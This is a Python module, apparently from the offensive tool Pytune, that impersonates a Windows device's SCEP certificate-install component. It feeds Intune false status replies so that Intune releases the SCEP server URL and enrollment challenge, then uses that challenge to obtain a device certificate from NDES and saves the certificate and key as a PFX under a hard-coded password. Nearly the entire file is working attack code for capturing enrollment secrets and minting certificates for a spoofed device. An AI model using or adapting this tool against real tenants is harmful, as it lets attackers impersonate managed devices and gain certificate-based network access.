"""
SCEP Workflow Simulator for Pytune

This module simulates Windows SCEP CSP responses to trick Intune into sending
the actual SCEP installation commands (ServerURL, Challenge, etc.) instead of
just status queries.

The key is responding to Intune's Get commands in a way that triggers it to
send Add/Replace commands with the full SCEP configuration.
"""

import base64
import hashlib
import uuid
from datetime import datetime, timedelta
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtensionOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend


class SCEPWorkflowSimulator:
    """
    Simulates SCEP certificate enrollment workflow for pytune
    
    Instead of actually installing certs, this:
    1. Responds to Intune queries to trigger SCEP installation commands
    2. Extracts SCEP configuration when Intune sends it
    3. Generates CSR and requests cert from NDES
    4. Saves cert+key as PFX file
    """
    
    def __init__(self, logger, device_name, device_id):
        self.logger = logger
        self.device_name = device_name
        self.device_id = device_id
        self.scep_profiles = {}  # Track SCEP profiles by unique ID
        self.certificates = {}   # Track issued certificates
        
    def handle_scep_query(self, scep_uri):
        """
        Handle Intune's SCEP status queries
        
        When Intune asks for Status/CertThumbprint/ErrorCode, we need to
        respond in a way that triggers it to send the Install commands.
        
        Args:
            scep_uri (str): The SCEP CSP URI being queried
            
        Returns:
            str or None: Response data, or None to trigger Add command
        """
        
        # Extract the unique profile ID from the URI
        # Format: ./Device/Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/...
        if '/SCEP/' not in scep_uri:
            return None
            
        parts = scep_uri.split('/SCEP/')
        if len(parts) < 2:
            return None
            
        profile_id = parts[1].split('/')[0]
        
        # Determine what Intune is asking for
        if scep_uri.endswith('/Status'):
            # Return empty/error status to trigger installation
            # Status codes: 1=Installed, 2=Pending, 3=Failed, empty=NotStarted
            return None  # Returning None = "I haven't started enrollment yet"
            
        elif scep_uri.endswith('/CertThumbprint'):
            # No thumbprint yet = triggers installation
            return None
            
        elif scep_uri.endswith('/ErrorCode'):
            # No error = proceed with installation
            return None
            
        elif scep_uri.endswith('/RespondentServerUrl'):
            # Return None to indicate we haven't enrolled yet
            return None
            
        return None
    
    def handle_scep_install(self, scep_commands):
        """
        Handle Intune's SCEP installation commands
        
        When Intune sends Add/Replace commands with ServerURL, Challenge, etc.,
        extract that configuration and trigger certificate enrollment.
        
        Args:
            scep_commands (dict): Dictionary of SCEP CSP URIs and their values
            
        Returns:
            dict: Responses to send back to Intune
        """
        responses = {}
        
        # Group commands by profile ID
        profiles = {}
        for uri, value in scep_commands.items():
            if '/SCEP/' not in uri or '/Install/' not in uri:
                continue
                
            # Extract profile ID
            profile_id = uri.split('/SCEP/')[1].split('/')[0]
            
            if profile_id not in profiles:
                profiles[profile_id] = {}
            
            # Extract setting name
            setting = uri.split('/Install/')[-1]
            profiles[profile_id][setting] = value
        
        # Process each SCEP profile
        for profile_id, config in profiles.items():
            self.logger.info(f"[!] SCEP Installation Detected: {profile_id}")
            
            # Extract configuration
            scep_url = config.get('ServerURL', '')
            challenge = config.get('Challenge', '')
            subject_name = config.get('SubjectName', '')
            key_usage = config.get('KeyUsage', '0')
            key_length = config.get('KeyLength', '2048')
            hash_algorithm = config.get('HashAlgorithm', '2')  # 2=SHA256
            validity_period = config.get('ValidityPeriod', '365')
            
            # EKU = Extended Key Usage
            eku_oids = config.get('ExtendedKeyUsages', '').split(',') if config.get('ExtendedKeyUsages') else []
            
            # SubjectAlternativeNames
            san_type = config.get('SubjectAlternativeNames', '')  # Can contain multiple types
            
            if scep_url and challenge:
                self.logger.info(f"[+] SCEP Configuration Captured!")
                self.logger.info(f"    Server: {scep_url}")
                self.logger.info(f"    Challenge: {challenge[:20]}... (length: {len(challenge)})")
                self.logger.info(f"    Subject: {subject_name}")
                self.logger.info(f"    Key Size: {key_length}")
                
                # Store profile for later enrollment
                self.scep_profiles[profile_id] = {
                    'server_url': scep_url,
                    'challenge': challenge,
                    'subject_name': subject_name,
                    'key_usage': key_usage,
                    'key_length': int(key_length) if key_length else 2048,
                    'hash_algorithm': hash_algorithm,
                    'validity_period': int(validity_period) if validity_period else 365,
                    'eku': eku_oids,
                    'san_type': san_type
                }
                
                # Trigger actual certificate enrollment
                success = self.enroll_certificate(profile_id)
                
                # Build response status
                if success:
                    # Report success back to Intune
                    cert_thumbprint = self.certificates.get(profile_id, {}).get('thumbprint', '')
                    
                    responses[f"./Device/Vendor/MSFT/ClientCertificateInstall/SCEP/{profile_id}/Status"] = "1"  # Installed
                    responses[f"./Device/Vendor/MSFT/ClientCertificateInstall/SCEP/{profile_id}/CertThumbprint"] = cert_thumbprint
                    responses[f"./Device/Vendor/MSFT/ClientCertificateInstall/SCEP/{profile_id}/ErrorCode"] = "0"
                    responses[f"./Device/Vendor/MSFT/ClientCertificateInstall/SCEP/{profile_id}/RespondentServerUrl"] = scep_url
                else:
                    # Report pending/error
                    responses[f"./Device/Vendor/MSFT/ClientCertificateInstall/SCEP/{profile_id}/Status"] = "2"  # Pending
                    responses[f"./Device/Vendor/MSFT/ClientCertificateInstall/SCEP/{profile_id}/ErrorCode"] = "0"
            else:
                self.logger.error(f"[-] Incomplete SCEP configuration for {profile_id}")
        
        return responses
    
    def enroll_certificate(self, profile_id):
        """
        Actually request certificate from NDES using SCEP
        
        Args:
            profile_id (str): SCEP profile unique ID
            
        Returns:
            bool: Success status
        """
        config = self.scep_profiles.get(profile_id)
        if not config:
            return False
        
        try:
            # Import SCEP client from the extension we built earlier
            from utils.scep import SCEPClient
            
            scep_client = SCEPClient(self.logger, proxy=None)
            
            # Prepare subject name with variable substitution
            subject_name = config['subject_name']
            if self.device_id:
                subject_name = subject_name.replace('{{AAD_Device_ID}}', self.device_id)
                subject_name = subject_name.replace('{{DeviceId}}', self.device_id)
            if self.device_name:
                subject_name = subject_name.replace('{{Device_Name}}', self.device_name)
                subject_name = subject_name.replace('{{DeviceName}}', self.device_name)
            
            self.logger.info(f"[*] Generating CSR for: {subject_name}")
            
            # Generate CSR
            san_dns = f"{self.device_name}.domain.local" if self.device_name else None
            private_key, csr_der = scep_client.generate_csr(
                subject_name=subject_name,
                key_size=config['key_length'],
                san_dns=san_dns,
                san_upn=None
            )
            
            # Send SCEP request
            self.logger.info(f"[*] Sending SCEP request to {config['server_url']}")
            cert_der = scep_client.send_scep_request(
                scep_url=config['server_url'],
                csr_der=csr_der,
                challenge=config['challenge']
            )
            
            if not cert_der:
                self.logger.error("[-] SCEP request failed - no certificate returned")
                return False
            
            # Save certificate and key as PFX
            output_pfx = f"{self.device_name}_scep_{profile_id[:8]}.pfx"
            success = scep_client.save_certificate_and_key(
                cert_der=cert_der,
                private_key=private_key,
                output_pfx_path=output_pfx,
                password=b'password'
            )
            
            if success:
                # Calculate thumbprint
                cert_obj = x509.load_der_x509_certificate(cert_der, default_backend())
                thumbprint = cert_obj.fingerprint(hashes.SHA1()).hex().upper()
                
                # Store certificate info
                self.certificates[profile_id] = {
                    'thumbprint': thumbprint,
                    'pfx_path': output_pfx,
                    'subject': subject_name
                }
                
                self.logger.info(f"[+] Certificate enrolled successfully!")
                self.logger.info(f"    Thumbprint: {thumbprint}")
                self.logger.info(f"    Saved to: {output_pfx}")
                
                return True
            else:
                return False
                
        except Exception as e:
            self.logger.error(f"[-] Certificate enrollment failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def get_enrolled_certificates(self):
        """
        Get list of successfully enrolled certificates
        
        Returns:
            list: List of certificate info dicts
        """
        return [
            {
                'profile_id': pid,
                'thumbprint': info['thumbprint'],
                'pfx_path': info['pfx_path'],
                'subject': info['subject']
            }
            for pid, info in self.certificates.items()
        ]
